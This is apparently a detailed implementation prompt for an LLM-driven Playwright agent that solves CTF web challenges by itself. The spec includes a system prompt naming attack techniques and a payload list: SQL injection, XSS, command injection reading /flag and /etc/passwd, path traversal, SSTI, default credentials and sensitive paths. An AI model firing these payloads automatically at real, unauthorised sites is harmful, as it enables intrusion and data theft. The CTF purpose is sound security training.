# CTF Web Agent Solver - Complete Implementation Prompt

## Project Overview

Build a comprehensive LangChain + Playwright web agent system designed to automatically solve CTF (Capture The Flag) web challenges. The system should use Ollama for all LLM inference, including both text reasoning and vision-language models.

## Core Requirements

1. **Use Ollama exclusively** for all AI inference:
   - Text model: `llama3.1` (or `llama3.1:8b`) for reasoning and planning
   - Vision model: `llava` or `minicpm-v` for screenshot analysis

2. **Browser automation via Playwright**:
   - Use CSS selectors and text-based element selection (NOT coordinate-based clicking)
   - Capture network requests, responses, cookies, localStorage, and console logs
   - Take screenshots for visual analysis

3. **Multi-source information gathering**:
   - Screenshots analyzed by VLM
   - DOM extraction for interactive elements
   - Network traffic monitoring (often contains flags or hints)
   - Cookie and localStorage inspection
   - HTML source analysis (comments, hidden fields)
   - Console log capture

4. **Agent architecture using LangGraph**:
   - Single orchestrator agent with tools
   - State machine for the agent loop
   - Human-in-the-loop capability when stuck

## Tech Stack

- Python 3.11+
- langchain >= 0.3.0
- langchain-ollama >= 0.2.0
- langgraph >= 0.2.0
- playwright >= 1.48.0
- rich >= 13.9.0 (for terminal UI)
- pydantic >= 2.9.0
- pydantic-settings >= 2.6.0
- httpx >= 0.27.0
- pillow >= 10.4.0

## Project Structure

```
ctf-web-agent/
├── pyproject.toml
├── README.md
├── .env.example
├── src/
│   ├── __init__.py
│   ├── main.py                 # Entry point with CLI
│   ├── config.py               # Configuration using pydantic-settings
│   ├── agent/
│   │   ├── __init__.py
│   │   ├── orchestrator.py     # Main LangGraph agent
│   │   ├── prompts.py          # All system prompts
│   │   └── state.py            # TypedDict state definition
│   ├── browser/
│   │   ├── __init__.py
│   │   ├── controller.py       # Playwright browser wrapper class
│   │   ├── extractors.py       # DOM, network, cookie, hint extraction
│   │   └── tools.py            # LangChain @tool decorated functions
│   ├── models/
│   │   ├── __init__.py
│   │   ├── ollama_client.py    # Ollama LLM setup
│   │   └── vision.py           # VLM screenshot analysis
│   └── utils/
│       ├── __init__.py
│       ├── flag_detector.py    # Regex flag pattern matching
│       ├── logger.py           # Rich console logging
│       └── hitl.py             # Human-in-the-loop utilities
└── tests/
    ├── __init__.py
    ├── test_browser.py
    └── test_agent.py
```

## Detailed Implementation Specifications

### 1. Configuration (`src/config.py`)

Create a Settings class using pydantic-settings with these fields:
- ollama_base_url: str = "http://localhost:11434"
- ollama_text_model: str = "llama3.1"
- ollama_vision_model: str = "llava"
- max_iterations: int = 30
- timeout_seconds: int = 30
- headless: bool = False
- slow_mo: int = 100
- viewport_width: int = 1280
- viewport_height: int = 720
- flag_patterns: list[str] with common CTF patterns (flag{}, CTF{}, picoCTF{}, HTB{}, etc.)
- hitl_enabled: bool = True

Use env_prefix = "CTF_" so environment variables like CTF_OLLAMA_TEXT_MODEL work.

### 2. Logger (`src/utils/logger.py`)

Create Rich-based logging utilities:
- setup_logging() -> configure RichHandler
- log_action(action, details) -> blue panel for actions taken
- log_observation(observation) -> green panel for observations
- log_thinking(thought) -> yellow panel for agent reasoning
- log_flag_found(flag) -> celebratory green panel
- log_error(error) -> red panel
- log_state(state) -> table showing current state (exclude screenshot_b64)

### 3. Flag Detector (`src/utils/flag_detector.py`)

- detect_flag(content: str) -> str | None: Search string for flag patterns
- detect_flag_in_page(html, cookies, local_storage, console_logs) -> str | None: Comprehensive search across all data sources

### 4. Human-in-the-Loop (`src/utils/hitl.py`)

- request_human_input(reason, context) -> str: Rich prompt for human input
- confirm_action(action, details) -> bool: Confirmation dialog
- show_options(options, prompt) -> int: Multiple choice selection

### 5. Ollama Client (`src/models/ollama_client.py`)

- get_text_model() -> ChatOllama: Return configured text model with low temperature (0.1)
- get_vision_model() -> ChatOllama: Return configured vision model
- analyze_screenshot(screenshot_b64, prompt, context) -> str: Send image to VLM
- check_ollama_available() -> bool: Verify Ollama is running and models exist

### 6. Vision Analysis (`src/models/vision.py`)

- CTF_ANALYSIS_PROMPT: System prompt for analyzing CTF screenshots
- analyze_ctf_page(screenshot_b64, url, interactive_elements, cookies, html_hints) -> str
- format_elements(elements) -> str: Format DOM elements for prompt
- format_cookies(cookies) -> str: Format cookies for prompt

The VLM should identify:
- Challenge type (SQLi, XSS, auth bypass, file upload, command injection, etc.)
- Interactive elements and their purpose
- Hints, comments, unusual elements
- Potential attack vectors

### 7. Browser Controller (`src/browser/controller.py`)

Create a BrowserController class:

```python
class BrowserController:
    def __init__(self):
        self.playwright = None
        self.browser = None
        self.context = None
        self.page = None
        self.network_requests = []
        self.network_responses = []
        self.console_logs = []
    
    async def initialize(self): ...
    async def close(self): ...
    def _capture_request(self, request): ...
    def _capture_response(self, response): ...
    def _capture_console(self, msg): ...
    def clear_captures(self): ...
    
    # Core actions
    async def navigate(self, url: str) -> str: ...
    async def click(self, selector: str) -> str: ...
    async def fill(self, selector: str, value: str) -> str: ...
    async def screenshot(self) -> str:  # Returns base64
    async def get_cookies(self) -> list[dict]: ...
    async def get_local_storage(self) -> dict: ...
    async def get_page_content(self) -> str: ...
    async def execute_js(self, code: str) -> str: ...
    async def go_back(self) -> str: ...
    async def go_forward(self) -> str: ...
    async def refresh(self) -> str: ...
    async def wait(self, seconds: float) -> str: ...
    async def scroll(self, direction: str, amount: int) -> str: ...
    async def hover(self, selector: str) -> str: ...
    async def select_option(self, selector: str, value: str) -> str: ...
    async def press_key(self, key: str) -> str: ...
    async def get_element_text(self, selector: str) -> str: ...
    async def get_attribute(self, selector: str, attribute: str) -> str: ...
    async def wait_for_selector(self, selector: str, timeout: int) -> str: ...
```

### 8. DOM Extractors (`src/browser/extractors.py`)

- extract_interactive_elements(page) -> list[dict]: Get all buttons, links, inputs, forms with their selectors
- extract_html_hints(page) -> list[str]: Find HTML comments, hidden fields, data attributes
- extract_forms(page) -> list[dict]: Detailed form structure with action, method, fields
- extract_links(page) -> list[dict]: All anchor tags with href and text
- build_element_selector(element_info) -> str: Generate reliable CSS selector for element

The interactive element extraction should use JavaScript evaluation:
```javascript
document.querySelectorAll('input, button, a, form, select, textarea, [onclick], [role="button"]')
```

For each element, capture:
- tag name
- id
- class names
- text content (truncated)
- type attribute
- href (for links)
- name attribute
- placeholder
- a reliable CSS selector

### 9. Browser Tools (`src/browser/tools.py`)

Create LangChain tools using the @tool decorator. Each tool should:
- Have a clear docstring explaining its purpose and parameters
- Handle errors gracefully and return descriptive error messages
- Log actions using the logger utilities

Required tools:
```python
@tool
async def navigate_to_url(url: str) -> str:
    """Navigate the browser to a specific URL."""

@tool
async def click_element(selector: str) -> str:
    """Click an element using CSS selector or text content.
    Examples: '#submit-btn', '.login-button', 'button:has-text("Login")'
    """

@tool
async def fill_input(selector: str, value: str) -> str:
    """Fill an input field with a value.
    Use for text inputs, textareas, and other form fields.
    """

@tool
async def get_page_state() -> dict:
    """Get comprehensive page state including screenshot, DOM, cookies, etc."""

@tool
async def execute_javascript(code: str) -> str:
    """Execute JavaScript code in the page context. Useful for XSS testing or extracting data."""

@tool
async def check_for_flag() -> str:
    """Search the current page for CTF flag patterns in HTML, cookies, localStorage, and console."""

@tool
async def analyze_page_visually() -> str:
    """Take a screenshot and analyze it with the vision model to understand the page."""

@tool
async def list_interactive_elements() -> str:
    """List all interactive elements on the page with their selectors."""

@tool
async def get_network_traffic() -> str:
    """Get captured network requests and responses since last clear."""

@tool
async def get_page_source() -> str:
    """Get the full HTML source of the current page."""

@tool
async def find_element_by_text(text: str) -> str:
    """Find elements containing specific text and return their selectors."""

@tool
async def submit_form(form_selector: str) -> str:
    """Submit a form by clicking its submit button or pressing Enter."""

@tool
async def request_human_help(reason: str) -> str:
    """Request assistance from a human operator when stuck."""

@tool
async def try_common_payloads(input_selector: str, payload_type: str) -> str:
    """Try common CTF payloads (sqli, xss, cmdi) on an input field.
    payload_type: 'sqli', 'xss', 'cmdi', 'path_traversal', 'ssti'
    """

@tool
async def scroll_page(direction: str) -> str:
    """Scroll the page up or down. direction: 'up' or 'down'"""

@tool
async def go_back() -> str:
    """Navigate back in browser history."""

@tool 
async def wait_for_element(selector: str, timeout: int = 5) -> str:
    """Wait for an element to appear on the page."""
```

### 10. Agent State (`src/agent/state.py`)

Define the agent state using TypedDict:
```python
from typing import TypedDict, Annotated
from langgraph.graph.message import add_messages

class AgentState(TypedDict):
    messages: Annotated[list, add_messages]
    current_url: str
    iteration: int
    page_analysis: str
    interactive_elements: list[dict]
    cookies: list[dict]
    local_storage: dict
    network_traffic: list[dict]
    console_logs: list[str]
    html_hints: list[str]
    flag_found: str | None
    error_count: int
    action_history: list[dict]
    needs_human_help: bool
    human_input: str | None
```

### 11. Agent Prompts (`src/agent/prompts.py`)

Create detailed prompts:

SYSTEM_PROMPT:
```
You are an expert CTF (Capture The Flag) web challenge solver. Your goal is to find the hidden flag on web pages by identifying and exploiting vulnerabilities.

You have access to tools for browser control, page analysis, and exploitation.

## Your Approach:
1. First, analyze the page visually and examine the DOM structure
2. Identify the challenge type (SQL injection, XSS, authentication bypass, etc.)
3. Look for hints in HTML comments, hidden fields, cookies, network traffic
4. Formulate and test hypotheses systematically
5. Try common payloads appropriate to the vulnerability type
6. Check for the flag after each significant action

## Common CTF Web Vulnerabilities:
- SQL Injection: Try ' OR '1'='1, admin'--, UNION SELECT, etc.
- XSS: Try <script>alert(1)</script>, event handlers, etc.
- Command Injection: Try ; ls, | cat /flag, `id`, etc.
- Path Traversal: Try ../../../etc/passwd, etc.
- Authentication Bypass: Default credentials, SQL injection in login, JWT manipulation
- Hidden Elements: Check page source, inspect hidden form fields
- Robots.txt / .git exposure: Check common sensitive paths
- Cookie manipulation: Inspect and modify cookie values

## Important Guidelines:
- Always use CSS selectors for element interaction, not coordinates
- Check network traffic - flags sometimes appear in responses
- Inspect cookies and localStorage - flags may be stored there
- Read HTML comments carefully - they often contain hints
- If stuck after several attempts, use request_human_help tool
- Be systematic - don't repeat failed approaches

## Flag Format:
Flags typically look like: flag{...}, CTF{...}, picoCTF{...}, HTB{...}
```

ANALYSIS_PROMPT - for processing visual and DOM information
PLANNING_PROMPT - for deciding next actions
REFLECTION_PROMPT - for analyzing failed attempts

### 12. Orchestrator Agent (`src/agent/orchestrator.py`)

Build the agent using LangGraph:

```python
from langgraph.graph import StateGraph, END
from langgraph.prebuilt import ToolNode
from langchain_core.messages import HumanMessage, SystemMessage, AIMessage

class CTFOrchestrator:
    def __init__(self, browser_controller: BrowserController):
        self.browser = browser_controller
        self.llm = get_text_model()
        self.tools = [...]  # All browser tools
        self.llm_with_tools = self.llm.bind_tools(self.tools)
        self.graph = self._build_graph()
    
    def _build_graph(self) -> StateGraph:
        # Create the state graph with nodes:
        # 1. analyze - Gather page state and analyze
        # 2. plan - Decide next action using LLM
        # 3. execute - Execute tool calls via ToolNode
        # 4. check_flag - Check if flag was found
        # 5. check_iteration - Check if max iterations reached
        # 6. human_intervention - Handle HITL if needed
        
        # Edges:
        # START -> analyze
        # analyze -> plan
        # plan -> execute (if tool call) OR plan -> check_flag (if no tool call)
        # execute -> check_flag
        # check_flag -> END (if flag found) OR check_flag -> check_iteration
        # check_iteration -> END (if max reached) OR check_iteration -> analyze
        # Any node -> human_intervention (conditional) -> analyze
    
    async def solve(self, challenge_url: str) -> dict:
        initial_state = {
            "messages": [
                SystemMessage(content=SYSTEM_PROMPT),
                HumanMessage(content=f"Solve the CTF challenge at: {challenge_url}")
            ],
            "current_url": challenge_url,
            "iteration": 0,
            "flag_found": None,
            # ... initialize other state fields
        }
        
        result = await self.graph.ainvoke(initial_state)
        return result
```

The graph should handle:
- State updates after each action
- Error recovery (increment error_count, try alternative approaches)
- Iteration limits
- Human-in-the-loop requests
- Flag detection at each step

### 13. Main Entry Point (`src/main.py`)

Create a CLI interface:
```python
import asyncio
import argparse
from rich.console import Console

async def main():
    parser = argparse.ArgumentParser(description="CTF Web Challenge Solver")
    parser.add_argument("url", help="URL of the CTF challenge")
    parser.add_argument("--headless", action="store_true", help="Run browser in headless mode")
    parser.add_argument("--max-iterations", type=int, default=30)
    parser.add_argument("--text-model", default="llama3.1")
    parser.add_argument("--vision-model", default="llava")
    parser.add_argument("--no-hitl", action="store_true", help="Disable human-in-the-loop")
    args = parser.parse_args()
    
    # Update settings from args
    # Check Ollama availability
    # Initialize browser
    # Create orchestrator
    # Run solver
    # Output results

if __name__ == "__main__":
    asyncio.run(main())
```

### 14. Common Payloads Database

Create a payloads module or data file with common CTF payloads:

```python
PAYLOADS = {
    "sqli": [
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR '1'='1'/*",
        "admin'--",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "1' ORDER BY 1--",
        "1' ORDER BY 10--",
        "' OR 1=1#",
        "admin' #",
        "') OR ('1'='1",
    ],
    "xss": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
        "'\"><script>alert(1)</script>",
        "<body onload=alert(1)>",
    ],
    "cmdi": [
        "; ls",
        "| ls",
        "& ls",
        "; cat /flag*",
        "| cat /flag*",
        "; cat /etc/passwd",
        "$(cat /flag*)",
        "`cat /flag*`",
    ],
    "path_traversal": [
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2fetc/passwd",
        "/etc/passwd",
        "....\/....\/....\/etc/passwd",
    ],
    "ssti": [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "{{config}}",
        "{{self.__class__.__mro__}}",
    ],
    "auth_bypass": [
        ("admin", "admin"),
        ("admin", "password"),
        ("admin", "admin123"),
        ("administrator", "administrator"),
        ("root", "root"),
        ("guest", "guest"),
    ],
    "sensitive_paths": [
        "/robots.txt",
        "/.git/config",
        "/.env",
        "/admin",
        "/flag",
        "/flag.txt",
        "/.htaccess",
        "/backup",
        "/config.php",
        "/debug",
    ],
}
```

### 15. README.md

Create documentation with:
- Project description
- Installation instructions (including Playwright install, Ollama setup)
- Usage examples
- Configuration options
- Architecture overview
- Contributing guidelines

### 16. .env.example

```
CTF_OLLAMA_BASE_URL=http://localhost:11434
CTF_OLLAMA_TEXT_MODEL=llama3.1
CTF_OLLAMA_VISION_MODEL=llava
CTF_MAX_ITERATIONS=30
CTF_HEADLESS=false
CTF_HITL_ENABLED=true
```

## Important Implementation Notes

1. **Selector Strategy**: Always prefer selectors in this order:
   - ID: `#element-id`
   - Unique class: `.unique-class`
   - Data attributes: `[data-testid="value"]`
   - Text content: `button:has-text("Submit")`
   - Combined: `form.login input[name="username"]`
   - nth-of-type as last resort

2. **Error Handling**: Every browser action should:
   - Be wrapped in try/except
   - Return descriptive error messages
   - Not crash the entire agent on failure

3. **State Management**: The agent state should persist:
   - All messages for context
   - Action history to avoid repetition
   - Error counts per approach
   - Successful and failed selectors

4. **Tool Responses**: Tools should return strings that are:
   - Informative for the LLM
   - Include relevant data (e.g., "Clicked button, page URL is now...")
   - Indicate success or failure clearly

5. **Vision Model Usage**: Use VLM analysis:
   - On initial page load
   - After significant navigation
   - When DOM analysis is insufficient
   - Not on every single action (too slow)

6. **Network Traffic**: Parse responses for:
   - JSON responses containing flags
   - Error messages with hints
   - Redirects to flag pages
   - Set-Cookie headers with interesting values

## Testing Considerations

Create tests that:
- Mock Ollama responses for deterministic testing
- Test browser tools in isolation
- Test flag detection patterns
- Test the full agent loop with a simple mock challenge

## Run Instructions

After implementation:
```bash
# Install dependencies
pip install -e .

# Install Playwright browsers
playwright install chromium

# Ensure Ollama is running with required models
ollama pull llama3.1
ollama pull llava

# Run the agent
python -m src.main "http://challenge-url.com"
# or
ctf-agent "http://challenge-url.com"
```

## Success Criteria

The implementation is complete when:
1. Agent can navigate to a URL and analyze the page
2. VLM can identify challenge types from screenshots
3. Agent can interact with forms and buttons using selectors
4. Agent can try common payloads systematically
5. Flag detection works across all data sources
6. Human-in-the-loop triggers when agent is stuck
7. Nice terminal output shows agent progress
8. Agent successfully solves basic CTF challenges (SQLi login bypass, hidden comment flags)

Now implement this complete system following the specifications above. Start with the core infrastructure (config, logger, browser controller) then build up to the full agent.
